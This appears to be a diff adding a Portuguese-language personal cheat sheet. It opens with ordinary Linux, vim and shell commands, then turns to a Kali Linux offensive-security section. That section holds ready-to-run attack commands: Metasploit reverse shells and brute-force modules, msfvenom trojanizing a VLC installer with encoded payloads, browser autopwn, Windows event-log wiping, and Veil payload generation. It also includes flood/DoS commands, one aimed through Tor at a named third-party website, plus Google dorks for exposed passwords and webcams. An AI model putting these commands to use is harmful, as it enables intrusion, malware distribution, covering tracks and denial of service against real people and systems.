@@ -1,0 +1,649 @@
+Botão do meio do mouse cola textos.
+Sempre dar preferencia para arquivos TAR.GZ porque ja vem com as permissões
+shift + g vai no final do arquivo com o "vim"
+remover bloqueio de tela por inatividade (opções de energia)
+clear -> limpa a tela
+exit -> sai do usuario atual
+shutdown now -> desligar o pc agora
+shutdown -P -> desligar o pc com um tempo
+shutdown -r -> reinicia o pc
+scp -r diretorio usuario@ip_maquina:~ -> copiar de uma maquina linux pra outra
+crtl + z -> para a execução do um programa
+fg -> volta com o program parado
+
+Uteis Partição
+  lsblk -> mostra os discos
+  sudo fdisk /dev/sdb
+  n -> nova particão
+  p -> primaria
+  enter -> manter opção padrão
+  enter -> manter opção padrão
+  enter -> manter opção padrão
+  w -> salvar
+  Definir um sistema de arquivo
+    sudo mkfs -t ext4 /dev/sdb1 
+    sudo mkfs -t fat32 /dev/sdb1 -> para windows e linux
+  sudo mkdir secundario
+  sudo mount /dev/sdb1 /mnt/secundario
+  sudo umount /mnt/secundario
+
+Comando uteis
+  ip s a -> mostra o ip
+  ifconfig -> motra o ip
+  apt install -f -> Corrigir problemas de instalação
+  curl ifconfig-me -> Ve o ip externo.
+  env -> variaveis de ambiente
+  export nome_variavel=valor -> cria uma variavel de ambiente temporaria 
+  unset nome_varivael -> remove variaveis criadas
+  man nome_comando -> manual dos comandos
+  info nome_comando -> manual com mais informações
+  less nome_arquivo_texto -> leitor de arquivos texto
+  whoami -> saber qual usuario estou
+  whereis nome_comando -> saber onde o comando esta localizado
+  whatis nome_comando -> fala o que o comando faz
+  locate nome_do_programa_ou_arquivo -> busca um programa ou arquivo no sistema
+  sudo updatedb -> atualiza o banco de dados para localizar mais arquivos
+  ls > texte.txt -> redireciona resultado do comando pra outro arquivo
+  ls >> texte.txt -> não sobrescreve o arquivo adicionar mais informações no mesmo
+  ls 2> texte.text -> redireciona a saida de erro
+  ls > texte.text 2>$1 -> redireciona pra outra saida
+  canal 0 (<) -> canal de entrada
+  canal 1 (>)-> canal saida padrão
+  canal 2 (>)-> canal saida de erro
+  | -> redirenciona pra outro comandos
+  type -> verifica o tipo do arquivo
+
+UTEIS VIM
+  vim nome_arquivo -> edita o arquivo e ou cria se não tiver
+  home/.vimrc -> altera configurações do vim
+  .vimrc ex
+    " execuçã do gerenciador de plugns
+    execute pathogen#infect()
+    " mudar a cor do backgroud do vim
+    " colorscheme industry 
+    " tamanho da identaçao
+    set tabstop=2
+    " Identifica o tipo do arquivo e identa
+    filetype plugin indent on
+    " colorir editor
+    syntax on
+    " deixar coerennte indentação com  tamanho de TAB
+    set shiftwidth=2
+    " comportamento usual do backspace
+    set backspace=2
+    " esse comando serve para numerar as linhas
+    " set number
+    " fazer calculo da distancia das linhas
+    " set relativenumber
+    " busca imcremental - feedback enquanto busco
+    set incsearch
+    " destaque nos resultados
+    set hlsearch
+  dd -> apaga linha
+  :q! -> sai forçado do editor
+  :q -> sai normal
+  :x -> salva e sai
+  :w -> salva
+  :wq -> salva e fecha
+  i -> insert mode
+  esc -> volta para o modo normal
+  / -> procura por texto dentro do arquivo; n -> pula proximo resultado; shift n -> volta resultado anterior
+  j -> pra baixo -> 10j -> pula 10 linhas pra baixo seve como qualquer numero e para k, l, h
+  k -> pra cima
+  l -> direita
+  h -> esquerda
+  u -> desfaz alteração
+  w -> pula palavra por palavra pra frente
+  b -> pula palavra por palavra pra tras
+  ctrl + R -> refaz alteração
+  o -> cria uma linha em baixo entra no modo de inserção e ja identa
+  shift + o -> cria uma linha acima
+  y -> copia
+  p -> cola
+  x -> deleta um caractere atual
+  q + qualquer_letra -> grava uma sequencia de comandos em uma letra 
+  q -> para de gravar
+  @ + q -> executa a gravação
+  shift + x -> deleta o caractere anterior
+  v -> seleciona um caractere
+  r -> replace um caractere
+  shift + a -> vai pro final da linha e abre modo de edição
+  shift + i -> vai para o começo da linha e abre modo de edição
+  shift + v -> modo de seleção de linha
+  crtl + v -> modo de seleção de bloco
+  crtl + n -> mostra um altocomplete de palavras usadas
+  == -> identa a linha corretamente
+  {shift + v} seleciona a linha depois {x} recorta depois sobre pra linha que quer colar {p} ele cola uma linha abaixo
+  %s/ul/nav/gc -> subistitui todos as ocorrencia de ul para nav no arquivo todo(g) escolhendo sim ou não(c)
+  %s/<li>//gc -> subistitui por nada
+  %s/<\/li>//gc -> \ escapa caracteres especiais
+  %s/figura-\(\d\)-depoimentos/figure-\1-testimonies/gc -> \d -> qualuer numero (esta () para pegar cada resultado e armazenar e usar depois no 1)
+  %s/figura-"\(.\{-}\)"-depoimentos/figure-"\1"-testimonies/gc
+    . -> pegar alque caractere
+    \{-} -> pega ate o a proxima aspas
+    \( \) -> armazena os valores pra usar depois
+    \1 -> usa o que foi salvo 1 é porque so tem um () se tivesse outro ia usar o 2 e assim por diante
+  gg -> volta pro começo de arquivo
+  shift + g -> final do arquivo
+  vs caminho_arquivo -> abre arquivos um do lado do outro
+  sp caminho_arquivo -> abre arquivos um de baixo do outro
+  crtl + w + w -> muda pro outro arquivo
+  crtl + w + h -> muda pro arquivo da esquerda
+  crtl + w + l -> muda pro arquivo da direita
+  Instlar plugns
+    mkdir -p ~/.vim/autoload ~/.vim/bundle && \
+    curl -LSso ~/.vim/autoload/pathogen.vim https://tpo.pe/pathogen.vim
+    depois é so pegar o plugn escolhido e dar um clone do git na basta bundle
+    git clone https://github.com/preservim/nerdtree.git ~/.vim/bundle/nerdtree
+    para usar :NERDTree
+  NERDTree
+    s -> abre o arquivo um do lado do outro
+      crtl + w + w -> muda pro outro arquivo
+      crtl + w + h -> muda pro arquivo da esquerda
+      crtl + w + l -> muda pro arquivo da direita
+    t -> abre o arquivo em aba
+      g + t -> passa de uma aba pra outra
+      1 + g + 1 -> vai pra aba um e assim por diante
+  Emmet -> criar varios comandos html
+    div.container.panel-group>div.panel.panel-default*10>div.panel-heading+div.panel-body
+    , + , -> executa o comando acima
+
+Uteis SCRIPT
+  ver mais exemplos na pasta scripts
+  #!/bin/bash -> sempre usar isso no começo do script para ser executado com o bash sempre (shebang)
+  echo 'diretorio' `pwd` -> resultado da execução do pwd como argumento para echo
+  $(pwd) -> resultado do pwd em outro comando
+  source (. ) -> executa um programa no shell atual
+  $? -> codigo de erro
+  ${HOME} -> usar uma variavel de ambiente
+  ${0} -> caminho para executar o script
+  ${1} -> argumento do script (pode ter varios argumentos 1, 2, 3... )
+  $# -> numero de argumentos passados
+  $* -> mostra todos os argumentos passados
+  '' -> aspas simples não interpretam varivais no script
+  for ano in $*
+  do
+    faça algo
+  done
+
+Uteis GREP
+  grep -> busca uma expressão dentro de um arquivo
+  grep -n -> buscar um expressão e mostra o numero da linha
+  grep -c -> conta o numero de linhas onde tem essa ocorrencia
+  grep -i -> ignora se é maiusculo ou minusculo
+  grep '201[0-9]' -> busca no arquivo por expressão regular 2010 ate 2019
+  grep '201[[:digit:]]' -> buscar de 0 a 9
+  grep '201[[:alnum]]' -> buscar de 0 ate 9, a ate z maiusculo e minusculo
+  grep '[[:digit]]\+,[[:digit:]]\+' -> mostra pelo menos 1 resultado ou mais de um com o '+'
+  grep '[[:digit]]\+,\?[[:digit:]]\+' -> 1 ou mais digitos, tem virgula ou não, 1 ou mais digitos
+  grep '[[:digit:]]*' -> zero ou mais resultados
+  grep '[[:punct:]] -> arquivos com pontuacao
+  grep '[,\.]' -> ou uma virgula ou um ponto
+  \ -> para escapar e o shell não interpretar
+  grep -v -> inverter a busca
+  grep -r -> busca em todos os arquivos do diretorio
+
+Uteis CUT
+  começa na posição 1
+  cut -c 1,4 -> cortar a coluna 1 e 4 de um arquivo
+  cut -c 1-4 -> cortar a coluna 1 ate a 4 de um arquivo
+  cut -c 1-4,10-15 -output-delimiter="," -> separa as colunas com ','
+  cut -f -d: 1,5 -> cortar 1 primeiro e o 5 campo separado pelo ':'
+
+Uteis PASTE
+  paste -> junta um arquivo no outro
+  paste -d: -> junta um arquivo com outro e separa com ':'
+  paste -s -> junta um arquivo com outro na horizontal
+
+Uteis SORT
+  sort -> ordena a entrada
+  sort -k 3 -t: -> ordena apartir do terceira coluna com o separador ':'
+  sort -r -> inverte a ordem
+  sort -u -> remove os iguais
+  sort -o -> escrever o resultado em outro arquivo
+
+Visualizar arquviso 
+  wc arquivo.txt -> Mostra numero de bits, numero de linhas, numero de palavra
+  wc -L -> Maximo de caracteres em uma linha
+  more arquivo.txt -> ler o arquivo
+  cat arquivo.txt -> mostra o TEXTO todo e conocatena varias textos 
+  car -n -> mostra o numero de linhas
+  head -> ver so as 10 primeiras linhas do arquivo
+  head -n 5 -> mostra so as 5 primeiras linhas
+  tail -> mostra as 10 ultimas linhas do arquivo
+  tail -n 5 -> mostra as 5 ultimas linhas
+  tail -f texte.txt -> fica mostrando alterações feitas no arquivo
+  Funções do Less
+    less nome_arquivo_texto
+    seta pra cima e pra baixo move o texto
+    ? alguma_pesquisa -> Pesquisar conteudo dentro do texto do final pro começo
+    / alguma_pesquisa -> Pesquisar conteudo dentro do texto do começo pro final
+      n -> proximo da busca
+      shift + n -> busca pra atras
+    spaço -> pula uma paginas
+    b -> volta uma pagina
+    g -> volta pro começo
+    shift + g -> vai para final
+    q -> sai do less
+    v -> abre o editor
+    ctrl + l -> redezenha a tela
+    h -> ajuda
+    !ls -> executa um comando
+
+Uteis Find
+  find -> localizar arquivos e programas
+  find -name "log*" -> começa com log
+  find -name "*log" -> termina com log
+  find -name "*log" -> log em qualquer lugar
+  find -name "*log*" -name "*2017*" -> bucar todos arquivos com log E 2017
+  find -name "*log*" -o -name "*2017*" -> buscar todos arquivos com log OU 2017
+  find -name \("*log*" -o -name "*2017*"\) -a -name "7" -> -a = AND
+  find -name "*log*" ! -name "*2017*" -> buscar todos arquivos com log e não tenha 2017
+  find -inmae -> iginora maiuscula e minuscula
+  find -type d -name "*user*" -> busca somente diretorios
+  find -type f -name "*user*" -> busca somente arquivos
+  find -type l -name "*user*" -> busca somente links simbolicos
+  find -user marcoservio -> busca todos arquivos que o usuario é o dono
+  find -size +5000k -> busca arquivo pelo tamanho
+  find -atime -7 -> busca pela data de acesso
+  find -mtime -7 -> busca pela data de modificação do conteudo
+  find -ctime -7 -> busca pela da de motificação de qualquer alteração
+  find -inum 231413 -> busca pelo inode
+  find -name "*log*" -name "*2017*" -exec ls -l "{}" \; -> Executar um comando para cada um dos resultados do find
+  find -name "*log*" -name "*2017*" -exec rm -i "{}" \; -> Apaga cada arquivo que foi encontrado no find perguntando se realmente que ser apagado
+
+Uteis Le
+  ls -R -> Lista todos os diretorios e filho e filho dos filhos recursivamente
+  ls * -> Lista todos os arquivos entrando em um nivel de diretorios
+  ls -l -> Lista longa com todas informações
+  ls -a -> Lista todos os arquivos do diretorio incluindo ocultos=
+  ls -S -> Ordena pelo tamanho
+  ls -t -> Ordena pela data
+  ls -X -> Ordena pela extensão
+  ls -r -> Inverte a ordem da listagem
+  ls -d -> Lista de somente um diretorio especifico (ls -ld /bin)
+  ls -i -> Mostra para qual nó esta apontando os arquivos
+  ls -F -> Indica, visualmente, através de caracteres o que cada coisa que está na lista é
+  ls -p -> So indica visualmente os diretorios
+
+Uteis diretorios e arquivo
+  mkdir -> cria o ultimo diretorio
+  mkdir -p teste/2020/teste -> cria todos os diretorios forçado
+  mkdir -p teste/202{1,2,3,4,5}/teste{1,2,3,4} -> criar a sequencia completa com glob
+  rmdir -> remove um diretorio vazio
+  rmdir -p -> remove todos os diretorios vazios
+  rmdir -pv -> apaga todos os diretorios e mostra a mensagem de cada um que foi removido(Verbose)
+  touch -> cria arquivos ou atualiza ultima modificação do arquivo ja existente  
+  rm -> so apaga arquivo
+  cp teste.txt teste2.txt -> copia um arquivo para outro
+  cp -vu loja/* lojabkp/ -> copia so os arquivos novos e o que foi alterado e verboso
+  cp -i -> Pergunta se quer sobrescrever
+  cp -b -> sobrescrever o arquivo mas faz um bkp do arquivo antes 
+  cp -r -> copiar recursivamente de um diretorio para outro
+  cp -f -> força a copia 
+  mv -> move um arquivo ou diretorio, se não tiver um diretorio ou arquivos ele vai renomear
+  rm -rf -> remove recursivamente forçado
+
+Uteis compactação/arquivamento
+  tar -cf teste.tar * -> arquiva todos os arquivos para o teste.tar
+  tar -tvf teste.tar -> ler o arquivo tar
+  tar -xf teste.tar -> Extrair arquivo
+  tar -uf teste.tar -> Atualiza o arquivamento com arquivos que sofreram modificação
+  tar -czvf loja.tar.gz * -> Arquivar e compactar com gzip
+  tar -cjvf loja.tar.bz2 * Arquivar e compactar com bzip2
+  tar -xzvf loja.tar.gz -> descompactar
+  gzip -> compacta um unico arquivo
+  gunzip -> descompacta
+  gzip -d -> descompacta
+  gzip -l -> lista que ta compactado
+  gzip -1v -> Roda mais rapido menos compactado
+  gzip -9v -> Roda mais devagar mais compactado
+  gzip -c -> mostra no terminal(txt) o arquivo compactado
+  bzip2 -> compacta
+  bunzip2 -> descompacta
+  bzip2 -d -> descompacta
+  zip teste.zip teste -> compacta
+  unzip -l -> lista de arquivos dentro de um zip
+  unzip -> descompactar
+  unzip -q -> descompacta sem mostrar nenhuma mensagem 
+  unzip -d home/temp/ teste.zip -> descompacta em outro diretorio
+  unzip teste.zip teste/teste1 -> descompacta somente arquivos escolhidos 
+  zip -rv -> zipar recursivamente verbose
+  find . -name "*.html" | zip -@ teste.zip -> zipar o que o resultado do find o "-@" pega cada um arquivo do resultado do find
+
+Verifiando informações de CPU
+  cat /proc/cpuinfo | more
+
+Prompt de comando
+  top 
+  z -> muda a cor
+  shift + z -> escolhe o esquema de cores
+  m -> memoria
+  L -> procurar palavra
+  free -h -> mostra informações sobre a memoria
+
+Localizar processos
+  ps -ef | grep apache
+  kill -9 numeroProcesso -> mata forçado o processo
+
+NETSTAT
+  netstat -h -> adjuda
+  netstat -tlpn -> portas TCP + portas escutando + processos + numero das portas
+  netstat -ulpn -> portas UDP + portas escutando + processos + numero das portas
+  netstat -s -> estatisticas
+
+
+
+KALI LINUX
+
+Pos instalação do Kali Linux
+  passwd -> Troca senha usuario padrão
+  sudo passwd root -> Troca senha do usuario root
+  systemctl start systemd-resolved -> Problemas para acessar a internet -> enable para criar uma rotina
+  apt-get update
+  apt-get upgrade
+  apt-get dist-upgrade
+  apt-get install tmux -> Dividir terminal em varias abas
+  apt-get install git
+
+ALTERAR MACADRESS
+  macchanger -h
+  macchanger -s wlan0
+  ifconfig wlan0 down
+  macchanger -r wlan0 -> mac randomica
+    macchanger --mac endereco_mac wlan0
+  macchanger -s wlan0
+  ifconfig wlan0 up
+  macchanger -p wlan0 -> volta pro original mas tem que fazer os passo a cima desligar e etc
+
+OWASP
+  http://190.109.64.218:8082/
+  http://192.168.100.72:8080/manager/html
+  <role rolename="manager"/>
+  <user username="tomcat" password="s3cret" roles="manager"/>
+
+Metasploit - Armitage
+  help
+  os comandos padrão do linux funciona quando ja esta em uma maquina alvo (cd, pwd, ls...)
+  download arquivo_alvo -> baixa um arquivo da maquina alvo
+  upload nome_arquivo -> manda um arquivo pra maquina alvo
+  lpwd -> local padrão kali
+  lcd -> mudar de diretorio kali
+  search -> procura algo na maquina
+  shell -> usa a shell do windows
+  vim /usr/share/metasploit-framework/data/wordlists/root_userpass.txt -> wordlist
+  msfdb init -> inicar o Metasploit
+  msfconsole -> abrir o Metasploit
+  db_status -> verificar status do banco
+  db_connect -h -> informações sobre o banco de dados
+  workspace -> lista workspaces
+  workspace -d -> remove
+  workspace -a Teste -> cria um workspace
+  db_nmap -sV 192.168.100.72 -> Verifica portas e programas disponiveis
+  db_nmap -Pn -p445 -script smb-os-discovery 192.168.100.72
+  search cve: 2017-0143  -> procurar por expoits 
+  use nome_do_exploit -> selecionar o exploit
+  set RHOSTS 192.168.100.72 -> configurar o host do alvo
+  run -> verificar se é vulneravel=
+  vulns -> mostra as vulnerabilidade
+  services -> serviços que podem ser executados
+  show options -> mostra as opções para o expoit
+  session -> mostra as sessoes
+  HTA -> executavel no windows que obtem o acesso a maquina ao abrir o arquivo
+    use exploit/windows/misc/hta_server
+    set payload windows/shell/reverse_tcp
+    set srvport 8888
+    set lport 12345
+    run
+    depois do alvo ter executado -> ctrl + d pra sair do expoit
+      sessions
+      e começa a exploração
+  Brute force ssh e telnet linux
+    use auxiliary/scanner/ssh/ssh_login -> ssh
+    use auxiliary/scanner/telnet/telnet_login -> telnet
+    show options
+    set rhosts 192.168.100.78
+    set verbose true
+    set userpass_file /usr/share/metasploit-framework/data/wordlists/root_userpass.txt -> caminho da wordlist
+    run
+    depois de ter pego o acesso entrar na sessão
+    sessions -i numero_id_Sessao
+    init 0 -> desliga a maquina
+  Ivandindo windows
+    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=192.168.100.71 LPORT=4444 -o /root/teste.exe -> Enviar arquivo para windows para obter acesso
+    msfvenom -a x86 --platform Windows -x vlc-3.0.18-win32.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.100.71 lport=4444 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o vlc-media-player.exe  -> colocar virus em um programa
+    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' lhost=192.168.100.71 lport=4444 -i 20 -f exe -o encoded_shell.exe -> encriptar o executavel
+    use multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST 192.168.100.71
+    set LPORT 4444
+    run
+    help
+    getuid -> pegar o nome do usuario
+    sysinfo -> informações do sistema
+  AUTOPWN
+    search autopwn
+    use auxiliary/server/browser_autopwn2
+    set payload_win windows/meterpreter/reverse_tcp
+    set srvhost 192.168.100.71 -> endereço minha maquina
+    set uripath "filetypes"
+    exploit
+  LIMPAR RASTROS WINDOWS
+    irb
+    log = client.sys.eventlog.open('system')
+    log = client.sys.eventlog.open('security')
+    log = client.sys.eventlog.open('application')
+    log = client.sys.eventlog.open('directory service')
+    log = client.sys.eventlog.open('dns server')    
+    log = client.sys.eventlog.open('file replication service')
+    Log.clear
+
+VEIL
+  apt install veil
+  veil
+  use 1
+  list
+  use 28 -> python
+  use 22 -> powershell
+  set LHOST 192.168.100.71
+  set USE_PYHERION Y
+  otions
+  generate
+  coloca o nome do arquivo 
+  2
+  /var/lib/veil/output/source -> arquivo criado fica aqui
+  msfconsole -r /var/lib/veil/output/handlers/power.rc -> deixar aguardando o alvo clicar no virus
+  
+
+Baixar paginas e projetos web
+  wget http://localhost:8080/bodgeit/ -> baixa uma pagina web em html
+  wget -r -P bodgeit_offline/ http://localhost:8080/bodgeit/ -> copiar toda o projeto web pastas, arquivos, imagens e etc.
+  httrack http://localhost:8080/bodgeit/ -> baixa todo o projeto web mais completo
+  
+Subir sites para teste de invasão
+  docker run --rm -p 3000:3000 bkimminich/juice-shop
+    admin@juice-sh.op
+    admin123
+  docker run --rm -p 8080:8080 securecodebox/bodgeit
+
+Interceptar  dados
+  Burp suit -> consegue interceptar tudo que que é feito no proxy
+  Zap
+    abri o programa
+    mudar proxy do navegador para 127.0.0.1 8080
+    localhost:8080 -> baixar arquivo de certificado para https e importar no navegador
+    ja vai estar monitorando os acessos aos sites
+
+Varias requisições em uma pagina
+  while :; do curl -l http://172.31.86.127; done;
+
+Instalando tor e tor Browser
+  sudo apt install -y tor torbrowser-launcher
+  torbrowser-launcher
+
+Instalação Adicionais Convidado
+  apt-cache search virtualbox-guest
+  apt install virtualbox-guest-*
+
+Instalação Google Ghrome
+  dpkg -i google-chrome-stable_current_amd64.deb
+  apt install -f -> Caso de algum erro de pacotes.
+  
+Escrita ao logar com root(figlet)
+  apt install figlet
+  vim ~/.zshrc
+  Ir no final do arquivo e inserir -> figlet "Nome"
+  
+Configurar acesso ssh
+  vim /etc/ssh/sshd_config
+  descomentar PermirRootLogin e colocar na frente yes
+  systemctl start ssh
+  systemctl enable ssh
+  netstat -tpan | grep 22 -> verificar se a porta 22 está aberta
+  
+Nessus
+  Baixar
+  dpkg -i Nessus-10.1.2-debian6_amd64.deb -> Instalar
+  /bin/systemctl start nessusd.service -> ativar nessus
+  https://192.168.1.13:8834/ -> acessar
+  
+Docker
+  Instalar
+  systemctl start docker
+  systemctl enable docker -> sempre abilitado
+  sudo usermod -aG docker $USER -> permitar acesso a outros usuarios
+  securecodebox/bodgeit -> site treinamento
+    docker pull securecodebox/bodgeit
+    docker run -it --rm -p 8080:8080 securecodebox/bodgeit
+    http://192.168.1.13:8080/bodgeit/
+  bkimminich/juice-shop -> site treinamento
+    docker pull bkimminich/juice-shop
+    docker run -it --rm -p 3000:3000 securecodebox/bodgeit
+    http://192.168.1.13:3000
+
+Colhendo informações
+  Verificar serviços e portas aberta
+    nmap -sP 192.168.100.39 -> Informações da maquina
+    nmap -sV 192.168.100.39 -> Serviço
+    nmap 192.168.100.39 -O -> Mostra o sistema operacional que ta rodando
+    nmap -sS -O www.alura.com.br -> Mostra que SO é o servidor
+    amap 192.168.100.36 1-100 -qb -> Mostra portas abertas de 1 a 100 
+    whatweb https://www.alura.com.br -> mostra informações sobre o site
+
+  Usando a força bruta para quebrar a senha de algum servidor
+    wpscan --url 192.168.100.73 --passwords /root/worldlist.txt -> worldlist são todas as senhas para testar
+    
+  cd /home/kali
+  cd goofuzz
+  ./GooFuzz -t site -e arquivos a ser procurado esta na pasta world list
+  sslscan 192.168.100.72 
+  sslyze 192.168.100.72
+  nikto -h 192.168.100.72  
+  
+  GVM
+    user: admin
+    senha: 7292ff8b-ecc8-4b46-99a3-79cbda029a4a
+    gvm-start
+
+  DMITRY
+    dmitry -p 192.168.100.72 -> lista todas as portas
+    dmitry -pb 192.168.100.72 -> mostras a portas e as versões do serviços(Banner)
+
+  DDOS
+    apt install iptraf-ng -> monitorador de pacotes
+    hping3 192.168.100.73 --faster --icmp -> manda os pacotes mais rapido
+    hping3 192.168.100.73 --flood --icmp -> manda o maximo de pacotes
+    hping3 192.168.100.73 --udp --flood --data 150000
+    hping3 192.168.100.73 -S --flood -p 80 --rand-source -> atacar na camada de transporte
+    t50 192.168.100.73 --flood --syn --dport 80
+    apt install etherape -> motorador de rede
+    git clone https://github.com/jseidl/GoldenEye.git -> script para negação de serviço
+    service start tor
+    proxychains ./goldeneye.py http://www.talismanonlinebrasil.com.br/
+
+
+  Google Hacking
+    "Intitle"
+    Exemplo: “intitle: senhas”.
+
+    "Allintitle"
+    Exemplo de Dork: “allintitle:admin”
+
+    "inurl"
+    Exemplo de Dork: “inurl:admin.php”
+
+    "allinurl"
+    Exemplo de Dork: “allinurl: login”
+
+    "filetype"
+    Exemplo de Dork: “filetype: pdf”
+
+    "intext"
+    Exemplo de Dork: “intext: @yahoo”
+
+    "allintext"
+    Exemplo de Dork: “allintext: pass”
+
+    "site"
+    Exemplo de Dork “site:com.br”
+    
+    Buscando senhas em arquivos de Anotações/Banco de Dados/Servidores:
+    # intitle:”index of /” password.txt
+    # filetype:txt + senha + com.br
+    # filetype:txt intext:senha
+    # intext: charset_test = email = default_persistent
+    # inurl: / wwwboard / passwd.txt
+    # filetype: log inurl: "password.log"
+    # filetype: conf inurl: proftpd.conf-sample
+    # filetype: bak inurl: “htaccess | passwd | shadow | htusers”
+    # outlook filetype: pst
+
+    Buscando backup de configurações de CMSs:
+
+    # filetype: inurl sql: wp-content / Backup-*
+    # intext:”~~Joomla1.txt” title:”Indexof /”
+    # configuration.php_ “<?phpclass Jconfig{“
+    # inurl:wp-config.old
+    # inurl:configuration.php.bkp
+
+    Acesso a impressora remotas
+
+    # intitle:”Web Image Monitor” & inurl:”/mainframe.cgi”
+
+    Buscando câmeras/webcams disponíveis na internet:
+
+    inurl:”inurl:/view.shtml”
+    inurl:”inurl:ViewerFrame?Mode=”
+    inurl:”intitle:”Live View / – AXIS” | inurl:view/view.shtml^”
+    inurl:”inurl:ViewerFrame?Mode=Refresh”
+    inurl:”inurl:axis-cgi/jpg”
+    inurl:”inurl:axis-cgi/mjpg (motion-JPEG)”
+    inurl:”inurl:view/indexFrame.shtml”
+
+    Buscando câmeras/webcams disponíveis na internet:
+
+    inurl:”inurl:/view.shtml”
+    inurl:”inurl:ViewerFrame?Mode=”
+    inurl:”intitle:”Live View / – AXIS” | inurl:view/view.shtml^”
+    inurl:”inurl:ViewerFrame?Mode=Refresh”
+    inurl:”inurl:axis-cgi/jpg”
+    inurl:"inurl:axis-cgi/mjpg (motion-JPEG)"
+    inurl:"inurl:view/indexFrame.shtml"
+    inurl:”intitle:”Live View / – AXIS””
+    inurl:”intitle:”Live View / – AXIS 206M””
+    inurl:”intitle:”Live View / – AXIS 206W””
+    inurl:”intitle:”Live View / – AXIS 210″”
+    inurl:”inurl:indexFrame.shtml Axis”
+    inurl:”inurl:”MultiCameraFrame?Mode=Motion””
+    inurl:”intitle:start inurl:cgistart"
+    inurl:”intitle:”WJ-NT104 Main Page””
+    inurl:”intext:”MOBOTIX M1″ intext:”Open Menu””
+    inurl:”intext:”MOBOTIX M10″ intext:”Open Menu””
+    inurl:”intext:”MOBOTIX D10″ intext:”Open Menu””
+    inurl:”intitle:snc-z20 inurl:home/”
+    inurl:”intitle:snc-cs3 inurl:home/”
+    inurl:”intitle:snc-rz30 inurl:home/"
+    inurl:”intitle:”sony network camera snc-p1″”
+    inurl:”intitle:”sony network camera snc-m1″”
+    inurl:”site:.viewnetcam.com -www.viewnetcam.com”
+    inurl:”intitle:”Toshiba Network Camera” user login”
